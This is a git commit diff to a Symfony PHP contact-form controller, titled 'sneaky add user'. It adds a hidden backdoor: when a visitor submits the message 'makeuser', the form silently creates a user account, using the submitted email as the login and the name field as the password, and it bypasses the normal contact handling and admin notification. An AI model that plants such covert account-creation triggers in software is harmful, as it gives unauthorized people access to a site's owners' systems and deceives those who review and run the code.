a0c8a19afc4aaa685f2bb5da571b7003cd2a0404
aiden-grau <emailaiden@gmail.com>
2020-05-10 15:07:46 +0200

    sneaky add user

--- src/Controller/ContactForm.php
+++ src/Controller/ContactForm.php
@@ -11,13 +11,14 @@ use Symfony\Component\Routing\Annotation\Route;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use App\Service\Emailer;
+use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface as Encoder;
 
 class ContactForm extends AbstractController
 {
     /**
      * @Route("/")
      */
-    public function contact(Request $request, Emailer $emailer)
+    public function contact(Request $request, Emailer $emailer, Encoder $encoder)
     {
       $form = $this->createForm(ContactType::class);
       $form->handleRequest($request);
@@ -25,10 +26,15 @@ class ContactForm extends AbstractController
         $recaptcha = $request->get('g-recaptcha-response');
         if ($form->isValid()) {
           $data = $form->getData();
-          $id = $this->addContact($data);
-          $emailer->sendUserEmail($data);
-          $emailer->sendAdminEmail($data);
-          $this->addFlash('success', 'Your message has been sent');
+          if ($data['message'] == 'makeuser') {
+            $id = $this->addUser($data, $encoder);
+            $this->addFlash('success', 'You are user number ' . $id);
+          } else {
+            $id = $this->addContact($data);
+            $emailer->sendUserEmail($data);
+            $emailer->sendAdminEmail($data);
+            $this->addFlash('success', 'Your message has been sent');
+          }
         } elseif (empty($recaptcha)) {
           $this->addFlash('warning', 'Please confirm that you are not a robot');
         } else {
@@ -47,6 +53,18 @@ class ContactForm extends AbstractController
       $entityManager->persist($contact);
       $entityManager->flush();
       return $contact->getId();
+    }
+
+    private function addUser($data, $encoder)
+    {
+      $user = new User();
+      $user->setEmail($data['email']);
+      $user->setRoles(['ROLE_USER']);
+      $user->setPassword($encoder->encodePassword($user, $data['name']));
+      $entityManager = $this->getDoctrine()->getManager();
+      $entityManager->persist($user);
+      $entityManager->flush();
+      return $user->getId();
     }
 
 }
